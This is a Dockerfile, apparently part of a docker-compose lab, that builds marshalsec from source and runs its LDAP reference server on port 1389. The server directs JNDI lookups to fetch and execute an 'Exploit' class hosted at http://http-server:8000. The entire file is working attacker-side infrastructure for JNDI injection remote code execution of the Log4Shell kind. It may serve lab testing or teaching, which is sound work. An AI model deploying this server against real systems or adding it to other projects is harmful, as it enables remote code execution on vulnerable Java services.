# marshalsec을 소스에서 직접 빌드하여 LDAP Reference 서버를 구동한다.
# 외부 사전 빌드 이미지에 의존하지 않고, 소스 클론 후 빌드한다.
FROM maven:3.8.6-eclipse-temurin-8 AS build
WORKDIR /build
RUN apt-get update && apt-get install -y --no-install-recommends git \
    && rm -rf /var/lib/apt/lists/*
RUN git clone https://github.com/mbechler/marshalsec.git . \
    && mvn -q -B clean package -DskipTests

FROM eclipse-temurin:8-jre
WORKDIR /app
COPY --from=build /build/target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jar
EXPOSE 1389

# http-server 컨테이너(8000포트)에서 서빙 중인 Exploit.class를 참조하도록
# LDAP Reference 서버 실행. 서비스명은 docker-compose 네트워크 기준.
CMD ["java", "-cp", "marshalsec.jar", "marshalsec.jndi.LDAPRefServer", "http://http-server:8000/#Exploit"]
